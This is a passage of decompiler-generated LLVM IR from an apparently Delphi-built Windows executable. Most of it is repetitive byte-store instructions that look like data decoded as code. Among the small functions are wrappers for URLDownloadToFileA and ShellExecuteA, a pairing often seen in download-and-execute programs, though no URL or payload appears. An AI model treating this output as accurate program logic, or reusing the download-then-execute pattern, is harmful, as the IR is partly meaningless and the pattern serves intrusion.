  store i8 %205, i8* %206, align 1, !insn.addr !364
  %207 = load i8, i8* %115, align 4, !insn.addr !365
  %208 = load i32, i32* %eax, align 4
  %209 = trunc i32 %208 to i8, !insn.addr !365
  %210 = add i8 %207, %209, !insn.addr !365
  %211 = inttoptr i32 %208 to i8*, !insn.addr !365
  store i8 %210, i8* %211, align 1, !insn.addr !365
  %212 = load i8, i8* %115, align 4, !insn.addr !366
  %213 = load i32, i32* %eax, align 4
  %214 = trunc i32 %213 to i8, !insn.addr !366
  %215 = add i8 %212, %214, !insn.addr !366
  %216 = inttoptr i32 %213 to i8*, !insn.addr !366
  store i8 %215, i8* %216, align 1, !insn.addr !366
  %217 = load i8, i8* %115, align 4, !insn.addr !367
  %218 = load i32, i32* %eax, align 4
  %219 = trunc i32 %218 to i8, !insn.addr !367
  %220 = add i8 %217, %219, !insn.addr !367
  %221 = inttoptr i32 %218 to i8*, !insn.addr !367
  store i8 %220, i8* %221, align 1, !insn.addr !367
  %222 = load i8, i8* %115, align 4, !insn.addr !368
  %223 = load i32, i32* %eax, align 4
  %224 = trunc i32 %223 to i8, !insn.addr !368
  %225 = add i8 %222, %224, !insn.addr !368
  %226 = inttoptr i32 %223 to i8*, !insn.addr !368
  store i8 %225, i8* %226, align 1, !insn.addr !368
  %227 = load i8, i8* %115, align 4, !insn.addr !369
  %228 = load i32, i32* %eax, align 4
  %229 = trunc i32 %228 to i8, !insn.addr !369
  %230 = add i8 %227, %229, !insn.addr !369
  %231 = inttoptr i32 %228 to i8*, !insn.addr !369
  store i8 %230, i8* %231, align 1, !insn.addr !369
  %232 = load i8, i8* %115, align 4, !insn.addr !370
  %233 = load i32, i32* %eax, align 4
  %234 = trunc i32 %233 to i8, !insn.addr !370
  %235 = add i8 %232, %234, !insn.addr !370
  %236 = inttoptr i32 %233 to i8*, !insn.addr !370
  store i8 %235, i8* %236, align 1, !insn.addr !370
  %237 = load i8, i8* %115, align 4, !insn.addr !371
  %238 = load i32, i32* %eax, align 4
  %239 = trunc i32 %238 to i8, !insn.addr !371
  %240 = add i8 %237, %239, !insn.addr !371
  %241 = inttoptr i32 %238 to i8*, !insn.addr !371
  store i8 %240, i8* %241, align 1, !insn.addr !371
  %242 = load i8, i8* %115, align 4, !insn.addr !372
  %243 = load i32, i32* %eax, align 4
  %244 = trunc i32 %243 to i8, !insn.addr !372
  %245 = add i8 %242, %244, !insn.addr !372
  %246 = inttoptr i32 %243 to i8*, !insn.addr !372
  store i8 %245, i8* %246, align 1, !insn.addr !372
  %.pre = udiv i32 %139, 256, !insn.addr !373
  %.pre1 = trunc i32 %.pre to i8, !insn.addr !373
  store i8 %.pre1, i8* %.pre-phi2.reg2mem, !insn.addr !372
  store i32 %139, i32* %ecx.1.reg2mem, !insn.addr !372
  br label %dec_label_pc_4048d3, !insn.addr !372

dec_label_pc_4048d3:                              ; preds = %dec_label_pc_40489d, %dec_label_pc_404891
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %.pre-phi2.reload = load i8, i8* %.pre-phi2.reg2mem
  %247 = load i8, i8* %115, align 4, !insn.addr !374
  %248 = load i32, i32* %eax, align 4
  %249 = trunc i32 %248 to i8, !insn.addr !374
  %250 = add i8 %247, %249, !insn.addr !374
  %251 = inttoptr i32 %248 to i8*, !insn.addr !374
  store i8 %250, i8* %251, align 1, !insn.addr !374
  %252 = load i8, i8* %115, align 4, !insn.addr !375
  %253 = load i32, i32* %eax, align 4
  %254 = trunc i32 %253 to i8, !insn.addr !375
  %255 = add i8 %252, %254, !insn.addr !375
  %256 = inttoptr i32 %253 to i8*, !insn.addr !375
  store i8 %255, i8* %256, align 1, !insn.addr !375
  %257 = load i8, i8* %115, align 4, !insn.addr !376
  %258 = load i32, i32* %eax, align 4
  %259 = trunc i32 %258 to i8, !insn.addr !376
  %260 = add i8 %257, %259, !insn.addr !376
  %261 = inttoptr i32 %258 to i8*, !insn.addr !376
  store i8 %260, i8* %261, align 1, !insn.addr !376
  %262 = load i8, i8* %115, align 4, !insn.addr !377
  %263 = load i32, i32* %eax, align 4
  %264 = trunc i32 %263 to i8, !insn.addr !377
  %265 = add i8 %262, %264, !insn.addr !377
  %266 = inttoptr i32 %263 to i8*, !insn.addr !377
  store i8 %265, i8* %266, align 1, !insn.addr !377
  %267 = add i32 %114, 98, !insn.addr !373
  %268 = inttoptr i32 %267 to i8*, !insn.addr !373
  %269 = load i8, i8* %268, align 1, !insn.addr !373
  %270 = add i8 %269, %.pre-phi2.reload, !insn.addr !373
  store i8 %270, i8* %268, align 1, !insn.addr !373
  %271 = add i32 %1, 111, !insn.addr !378
  %272 = inttoptr i32 %271 to i16*, !insn.addr !378
  %273 = load i16, i16* %272, align 2, !insn.addr !378
  %274 = trunc i32 %0 to i16, !insn.addr !378
  call void @__asm_arpl(i16 %273, i16 %274), !insn.addr !378
  %275 = load i8, i8* %115, align 4, !insn.addr !379
  %276 = load i32, i32* %eax, align 4
  %277 = trunc i32 %276 to i8, !insn.addr !379
  %278 = add i8 %275, %277, !insn.addr !379
  %279 = inttoptr i32 %276 to i8*, !insn.addr !379
  store i8 %278, i8* %279, align 1, !insn.addr !379
  %280 = load i8, i8* %115, align 4, !insn.addr !380
  %281 = load i32, i32* %eax, align 4
  %282 = trunc i32 %281 to i8, !insn.addr !380
  %283 = add i8 %280, %282, !insn.addr !380
  %284 = inttoptr i32 %281 to i8*, !insn.addr !380
  store i8 %283, i8* %284, align 1, !insn.addr !380
  %285 = load i8, i8* %115, align 4, !insn.addr !381
  %286 = load i32, i32* %eax, align 4
  %287 = trunc i32 %286 to i8, !insn.addr !381
  %288 = add i8 %285, %287, !insn.addr !381
  %289 = inttoptr i32 %286 to i8*, !insn.addr !381
  store i8 %288, i8* %289, align 1, !insn.addr !381
  %290 = load i8, i8* %115, align 4, !insn.addr !382
  %291 = load i32, i32* %eax, align 4
  %292 = trunc i32 %291 to i8, !insn.addr !382
  %293 = add i8 %290, %292, !insn.addr !382
  %294 = inttoptr i32 %291 to i8*, !insn.addr !382
  store i8 %293, i8* %294, align 1, !insn.addr !382
  %295 = load i8, i8* %115, align 4, !insn.addr !383
  %296 = load i32, i32* %eax, align 4
  %297 = trunc i32 %296 to i8, !insn.addr !383
  %298 = add i8 %295, %297, !insn.addr !383
  %299 = inttoptr i32 %296 to i8*, !insn.addr !383
  store i8 %298, i8* %299, align 1, !insn.addr !383
  %300 = load i8, i8* %115, align 4, !insn.addr !384
  %301 = load i32, i32* %eax, align 4
  %302 = trunc i32 %301 to i8, !insn.addr !384
  %303 = add i8 %300, %302, !insn.addr !384
  %304 = inttoptr i32 %301 to i8*, !insn.addr !384
  store i8 %303, i8* %304, align 1, !insn.addr !384
  %305 = load i8, i8* %115, align 4, !insn.addr !385
  %306 = load i32, i32* %eax, align 4
  %307 = trunc i32 %306 to i8, !insn.addr !385
  %308 = add i8 %305, %307, !insn.addr !385
  %309 = inttoptr i32 %306 to i8*, !insn.addr !385
  store i8 %308, i8* %309, align 1, !insn.addr !385
  %310 = load i8, i8* %115, align 4, !insn.addr !386
  %311 = load i32, i32* %eax, align 4
  %312 = trunc i32 %311 to i8, !insn.addr !386
  %313 = add i8 %310, %312, !insn.addr !386
  %314 = inttoptr i32 %311 to i8*, !insn.addr !386
  store i8 %313, i8* %314, align 1, !insn.addr !386
  %315 = load i8, i8* %115, align 4, !insn.addr !387
  %316 = load i32, i32* %eax, align 4
  %317 = trunc i32 %316 to i8, !insn.addr !387
  %318 = add i8 %315, %317, !insn.addr !387
  %319 = inttoptr i32 %316 to i8*, !insn.addr !387
  store i8 %318, i8* %319, align 1, !insn.addr !387
  %320 = load i8, i8* %115, align 4, !insn.addr !388
  %321 = load i32, i32* %eax, align 4
  %322 = trunc i32 %321 to i8, !insn.addr !388
  %323 = add i8 %320, %322, !insn.addr !388
  %324 = inttoptr i32 %321 to i8*, !insn.addr !388
  store i8 %323, i8* %324, align 1, !insn.addr !388
  %325 = load i8, i8* %115, align 4, !insn.addr !389
  %326 = load i32, i32* %eax, align 4
  %327 = trunc i32 %326 to i8, !insn.addr !389
  %328 = add i8 %325, %327, !insn.addr !389
  %329 = inttoptr i32 %326 to i8*, !insn.addr !389
  store i8 %328, i8* %329, align 1, !insn.addr !389
  %330 = load i8, i8* %115, align 4, !insn.addr !390
  %331 = load i32, i32* %eax, align 4
  %332 = trunc i32 %331 to i8, !insn.addr !390
  %333 = add i8 %330, %332, !insn.addr !390
  %334 = inttoptr i32 %331 to i8*, !insn.addr !390
  store i8 %333, i8* %334, align 1, !insn.addr !390
  %335 = load i8, i8* %115, align 4, !insn.addr !391
  %336 = load i32, i32* %eax, align 4
  %337 = trunc i32 %336 to i8, !insn.addr !391
  %338 = add i8 %335, %337, !insn.addr !391
  %339 = inttoptr i32 %336 to i8*, !insn.addr !391
  store i8 %338, i8* %339, align 1, !insn.addr !391
  %340 = load i8, i8* %115, align 4, !insn.addr !392
  %341 = load i32, i32* %eax, align 4
  %342 = trunc i32 %341 to i8, !insn.addr !392
  %343 = add i8 %340, %342, !insn.addr !392
  %344 = inttoptr i32 %341 to i8*, !insn.addr !392
  store i8 %343, i8* %344, align 1, !insn.addr !392
  %345 = load i8, i8* %115, align 4, !insn.addr !393
  %346 = load i32, i32* %eax, align 4
  %347 = trunc i32 %346 to i8, !insn.addr !393
  %348 = add i8 %345, %347, !insn.addr !393
  %349 = inttoptr i32 %346 to i8*, !insn.addr !393
  store i8 %348, i8* %349, align 1, !insn.addr !393
  %350 = load i8, i8* %115, align 4, !insn.addr !394
  %351 = load i32, i32* %eax, align 4
  %352 = trunc i32 %351 to i8, !insn.addr !394
  %353 = add i8 %350, %352, !insn.addr !394
  %354 = inttoptr i32 %351 to i8*, !insn.addr !394
  store i8 %353, i8* %354, align 1, !insn.addr !394
  %355 = load i8, i8* %115, align 4, !insn.addr !395
  %356 = load i32, i32* %eax, align 4
  %357 = trunc i32 %356 to i8, !insn.addr !395
  %358 = add i8 %355, %357, !insn.addr !395
  %359 = inttoptr i32 %356 to i8*, !insn.addr !395
  store i8 %358, i8* %359, align 1, !insn.addr !395
  %360 = load i8, i8* %115, align 4, !insn.addr !396
  %361 = load i32, i32* %eax, align 4
  %362 = trunc i32 %361 to i8, !insn.addr !396
  %363 = add i8 %360, %362, !insn.addr !396
  %364 = inttoptr i32 %361 to i8*, !insn.addr !396
  store i8 %363, i8* %364, align 1, !insn.addr !396
  %365 = load i8, i8* %115, align 4, !insn.addr !397
  %366 = load i32, i32* %eax, align 4
  %367 = trunc i32 %366 to i8, !insn.addr !397
  %368 = add i8 %365, %367, !insn.addr !397
  %369 = inttoptr i32 %366 to i8*, !insn.addr !397
  store i8 %368, i8* %369, align 1, !insn.addr !397
  %370 = load i8, i8* %115, align 4, !insn.addr !398
  %371 = load i32, i32* %eax, align 4
  %372 = trunc i32 %371 to i8, !insn.addr !398
  %373 = add i8 %370, %372, !insn.addr !398
  %374 = inttoptr i32 %371 to i8*, !insn.addr !398
  store i8 %373, i8* %374, align 1, !insn.addr !398
  %375 = load i8, i8* %115, align 4, !insn.addr !399
  %376 = load i32, i32* %eax, align 4
  %377 = trunc i32 %376 to i8, !insn.addr !399
  %378 = add i8 %375, %377, !insn.addr !399
  %379 = inttoptr i32 %376 to i8*, !insn.addr !399
  store i8 %378, i8* %379, align 1, !insn.addr !399
  %380 = load i8, i8* %115, align 4, !insn.addr !400
  %381 = load i32, i32* %eax, align 4
  %382 = trunc i32 %381 to i8, !insn.addr !400
  %383 = add i8 %380, %382, !insn.addr !400
  %384 = inttoptr i32 %381 to i8*, !insn.addr !400
  store i8 %383, i8* %384, align 1, !insn.addr !400
  %385 = load i8, i8* %115, align 4, !insn.addr !401
  %386 = load i32, i32* %eax, align 4
  %387 = trunc i32 %386 to i8, !insn.addr !401
  %388 = add i8 %385, %387, !insn.addr !401
  %389 = inttoptr i32 %386 to i8*, !insn.addr !401
  store i8 %388, i8* %389, align 1, !insn.addr !401
  %390 = load i8, i8* %115, align 4, !insn.addr !402
  %391 = load i32, i32* %eax, align 4
  %392 = trunc i32 %391 to i8, !insn.addr !402
  %393 = add i8 %390, %392, !insn.addr !402
  %394 = inttoptr i32 %391 to i8*, !insn.addr !402
  store i8 %393, i8* %394, align 1, !insn.addr !402
  %395 = load i8, i8* %115, align 4, !insn.addr !403
  %396 = load i32, i32* %eax, align 4
  %397 = trunc i32 %396 to i8, !insn.addr !403
  %398 = add i8 %395, %397, !insn.addr !403
  %399 = inttoptr i32 %396 to i8*, !insn.addr !403
  store i8 %398, i8* %399, align 1, !insn.addr !403
  %400 = load i8, i8* %115, align 4, !insn.addr !404
  %401 = load i32, i32* %eax, align 4
  %402 = trunc i32 %401 to i8, !insn.addr !404
  %403 = add i8 %400, %402, !insn.addr !404
  %404 = inttoptr i32 %401 to i8*, !insn.addr !404
  store i8 %403, i8* %404, align 1, !insn.addr !404
  %405 = load i8, i8* %115, align 4, !insn.addr !405
  %406 = load i32, i32* %eax, align 4
  %407 = trunc i32 %406 to i8, !insn.addr !405
  %408 = add i8 %405, %407, !insn.addr !405
  %409 = inttoptr i32 %406 to i8*, !insn.addr !405
  store i8 %408, i8* %409, align 1, !insn.addr !405
  %410 = load i8, i8* %115, align 4, !insn.addr !406
  %411 = load i32, i32* %eax, align 4
  %412 = trunc i32 %411 to i8, !insn.addr !406
  %413 = add i8 %410, %412, !insn.addr !406
  %414 = inttoptr i32 %411 to i8*, !insn.addr !406
  store i8 %413, i8* %414, align 1, !insn.addr !406
  %415 = load i8, i8* %115, align 4, !insn.addr !407
  %416 = load i32, i32* %eax, align 4
  %417 = trunc i32 %416 to i8, !insn.addr !407
  %418 = add i8 %415, %417, !insn.addr !407
  %419 = icmp eq i8 %418, 0, !insn.addr !407
  %420 = inttoptr i32 %416 to i8*, !insn.addr !407
  store i8 %418, i8* %420, align 1, !insn.addr !407
  %421 = load i8, i8* %115, align 4
  %422 = load i32, i32* %eax, align 4
  %423 = trunc i32 %422 to i8
  %424 = add i8 %421, %423
  %425 = inttoptr i32 %422 to i8*
  store i8 %424, i8* %425, align 1
  %426 = load i8, i8* %115, align 4
  %427 = load i32, i32* %eax, align 4
  %428 = trunc i32 %427 to i8
  %429 = add i8 %426, %428
  %430 = inttoptr i32 %427 to i8*
  store i8 %429, i8* %430, align 1
  br i1 %419, label %dec_label_pc_404990, label %dec_label_pc_404995, !insn.addr !408

dec_label_pc_404990:                              ; preds = %dec_label_pc_4048d3
  %431 = load i32, i32* %eax, align 4, !insn.addr !409
  ret i32 %431, !insn.addr !409

dec_label_pc_404995:                              ; preds = %dec_label_pc_4048d3
  %432 = load i8, i8* %115, align 4
  %433 = load i32, i32* %eax, align 4
  %434 = trunc i32 %433 to i8
  %435 = add i8 %432, %434
  %436 = inttoptr i32 %433 to i8*
  store i8 %435, i8* %436, align 1
  %437 = load i8, i8* %115, align 4
  %438 = load i32, i32* %eax, align 4
  %439 = trunc i32 %438 to i8
  %440 = add i8 %437, %439
  %441 = inttoptr i32 %438 to i8*
  store i8 %440, i8* %441, align 1
  %442 = load i8, i8* %115, align 4
  %443 = load i32, i32* %eax, align 4
  %444 = trunc i32 %443 to i8
  %445 = add i8 %442, %444
  %446 = inttoptr i32 %443 to i8*
  store i8 %445, i8* %446, align 1
  %447 = load i8, i8* %115, align 4
  %448 = load i32, i32* %eax, align 4
  %449 = trunc i32 %448 to i8
  %450 = add i8 %447, %449
  %451 = inttoptr i32 %448 to i8*
  store i8 %450, i8* %451, align 1
  %452 = load i8, i8* %115, align 4
  %453 = load i32, i32* %eax, align 4
  %454 = trunc i32 %453 to i8
  %455 = add i8 %452, %454
  %456 = inttoptr i32 %453 to i8*
  store i8 %455, i8* %456, align 1
  %457 = load i8, i8* %115, align 4
  %458 = load i32, i32* %eax, align 4
  %459 = trunc i32 %458 to i8
  %460 = add i8 %457, %459
  %461 = inttoptr i32 %458 to i8*
  store i8 %460, i8* %461, align 1
  %462 = load i8, i8* %115, align 4
  %463 = load i32, i32* %eax, align 4
  %464 = trunc i32 %463 to i8
  %465 = add i8 %462, %464
  %466 = inttoptr i32 %463 to i8*
  store i8 %465, i8* %466, align 1
  %467 = add i32 %ecx.1.reload, 108, !insn.addr !410
  %468 = inttoptr i32 %467 to i8*, !insn.addr !410
  %469 = load i8, i8* %468, align 1, !insn.addr !410
  %470 = add i8 %469, %.pre-phi2.reload, !insn.addr !410
  store i8 %470, i8* %468, align 1, !insn.addr !410
  %471 = load i32, i32* %eax, align 4, !insn.addr !410
  ret i32 %471, !insn.addr !410
}

define i32 @function_404a11() local_unnamed_addr {
dec_label_pc_404a11:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !411
  ret i32 %0, !insn.addr !411
}

define i32 @function_404a16() local_unnamed_addr {
dec_label_pc_404a16:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !412
}

define i32 @function_404a18(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !413
}

define i32 @function_404a1c() local_unnamed_addr {
dec_label_pc_404a1c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !414
  %2 = add i32 %1, -1, !insn.addr !414
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !414
  ret i32 %0, !insn.addr !415
}

define i32 @function_404a24() local_unnamed_addr {
dec_label_pc_404a24:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !416
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !416
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !416
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !417
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !418
  %3 = add i32 %2, 1, !insn.addr !418
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !418
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !419
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !420
  ret i32 0, !insn.addr !421
}

define i32 @function_404a49() local_unnamed_addr {
dec_label_pc_404a49:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !422
  ret i32 %0, !insn.addr !422
}

define i32 @function_404a4e() local_unnamed_addr {
dec_label_pc_404a4e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !423
}

define i32 @function_404a50(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !424
}

define i32 @function_404a54() local_unnamed_addr {
dec_label_pc_404a54:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !425
  %2 = add i32 %1, -1, !insn.addr !425
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !425
  ret i32 %0, !insn.addr !426
}

define i32* @function_404a5c(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a5c:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !427
  ret i32* %0, !insn.addr !427
}

define i32 @function_404a64() local_unnamed_addr {
dec_label_pc_404a64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !428
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !428
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !428
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !429
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !430
  %3 = add i32 %2, 1, !insn.addr !430
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !430
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !431
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !432
  ret i32 0, !insn.addr !433
}

define i32 @function_404a89() local_unnamed_addr {
dec_label_pc_404a89:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !434
  ret i32 %0, !insn.addr !434
}

define i32 @function_404a8e() local_unnamed_addr {
dec_label_pc_404a8e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !435
}

define i32 @function_404a90(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a90:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !436
}

define i32 @function_404a94() local_unnamed_addr {
dec_label_pc_404a94:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !437
  %2 = add i32 %1, -1, !insn.addr !437
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !437
  ret i32 %0, !insn.addr !438
}

define i32 @function_404a9c() local_unnamed_addr {
dec_label_pc_404a9c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !439
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !439
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !439
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !440
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !441
  %3 = add i32 %2, 1, !insn.addr !441
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !441
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !442
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !443
  ret i32 0, !insn.addr !444
}

define i32 @function_404ac1() local_unnamed_addr {
dec_label_pc_404ac1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !445
  ret i32 %0, !insn.addr !445
}

define i32 @function_404ac6() local_unnamed_addr {
dec_label_pc_404ac6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !446
}

define i32 @function_404ac8(i32 %arg1) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !447
}

define i32 @function_404acc() local_unnamed_addr {
dec_label_pc_404acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !448
  %2 = add i32 %1, -1, !insn.addr !448
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !448
  ret i32 %0, !insn.addr !449
}

define i32 @function_404ad4() local_unnamed_addr {
dec_label_pc_404ad4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !450
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !450
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !450
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !451
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !452
  %3 = add i32 %2, 1, !insn.addr !452
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !452
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !453
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !454
  ret i32 0, !insn.addr !455
}

define i32 @function_404af9() local_unnamed_addr {
dec_label_pc_404af9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !456
  ret i32 %0, !insn.addr !456
}

define i32 @function_404afe() local_unnamed_addr {
dec_label_pc_404afe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !457
}

define i32 @function_404b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !458
}

define i32 @function_404b04() local_unnamed_addr {
dec_label_pc_404b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !459
  %2 = add i32 %1, -1, !insn.addr !459
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !459
  ret i32 %0, !insn.addr !460
}

define i32 @function_404b0c(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404b0c:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !461
  ret i32 %0, !insn.addr !461
}

define i32 @function_404b14() local_unnamed_addr {
dec_label_pc_404b14:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !462
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !462
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !462
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !463
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !464
  %3 = add i32 %2, 1, !insn.addr !464
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !464
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !465
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !466
  ret i32 0, !insn.addr !467
}

define i32 @function_404b39() local_unnamed_addr {
dec_label_pc_404b39:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !468
  ret i32 %0, !insn.addr !468
}

define i32 @function_404b3e() local_unnamed_addr {
dec_label_pc_404b3e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !469
}

define i32 @function_404b40(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !470
}

define i32 @function_404b44() local_unnamed_addr {
dec_label_pc_404b44:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !471
  %2 = add i32 %1, -1, !insn.addr !471
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !471
  ret i32 %0, !insn.addr !472
}

define i32 @function_404b4c() local_unnamed_addr {
dec_label_pc_404b4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !473
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b50, label %dec_label_pc_404b59, !insn.addr !474

dec_label_pc_404b50:                              ; preds = %dec_label_pc_404b4c
  %4 = add nuw nsw i32 %3, 48, !insn.addr !475
  ret i32 %4, !insn.addr !476

dec_label_pc_404b59:                              ; preds = %dec_label_pc_404b4c
  %5 = add nuw nsw i32 %3, 55, !insn.addr !477
  ret i32 %5, !insn.addr !478
}

define i32 @function_404b64() local_unnamed_addr {
dec_label_pc_404b64:
  %esp.2.reg2mem = alloca i32, !insn.addr !479
  %esp.1.reg2mem = alloca i32, !insn.addr !479
  %cf.0.reg2mem = alloca i1, !insn.addr !479
  %esi.0.reg2mem = alloca i32, !insn.addr !479
  %esp.0.reg2mem = alloca i32, !insn.addr !479
  %ebx.0.reg2mem = alloca i32, !insn.addr !479
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !480
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !481
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !481
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !481
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !482
  %4 = call i32 @"@LStrClr"(), !insn.addr !483
  %5 = call i32 @function_4034c8(), !insn.addr !484
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !485
  br i1 %6, label %dec_label_pc_404c65, label %dec_label_pc_404bb1.preheader, !insn.addr !485

dec_label_pc_404bb1.preheader:                    ; preds = %dec_label_pc_404b64
  %7 = add i32 %0, -1, !insn.addr !486
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404bb1

dec_label_pc_404bb1:                              ; preds = %dec_label_pc_404bb1.preheader, %dec_label_pc_404c5d
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !486
  %9 = inttoptr i32 %8 to i8*, !insn.addr !486
  %10 = load i8, i8* %9, align 1, !insn.addr !486
  %11 = icmp eq i8 %10, 32, !insn.addr !486
  %12 = icmp eq i1 %11, false, !insn.addr !487
  br i1 %12, label %dec_label_pc_404bcc, label %dec_label_pc_404bbb, !insn.addr !487

dec_label_pc_404bbb:                              ; preds = %dec_label_pc_404bb1
  %13 = call i32 @"@LStrCat"(), !insn.addr !488
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !489
  br label %dec_label_pc_404c5d, !insn.addr !489

dec_label_pc_404bcc:                              ; preds = %dec_label_pc_404bb1
  %14 = icmp ult i8 %10, 32, !insn.addr !490
  br i1 %14, label %dec_label_pc_404bef, label %dec_label_pc_404bd6, !insn.addr !491

dec_label_pc_404bd6:                              ; preds = %dec_label_pc_404bcc
  %15 = add i8 %10, -32, !insn.addr !492
  %16 = icmp ult i8 %15, 95, !insn.addr !493
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !494
  br i1 %17, label %dec_label_pc_404be3, label %dec_label_pc_404bed, !insn.addr !494

dec_label_pc_404be3:                              ; preds = %dec_label_pc_404bd6
  %18 = load i32, i32* inttoptr (i32 4213924 to i32*), align 4, !insn.addr !495
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !495
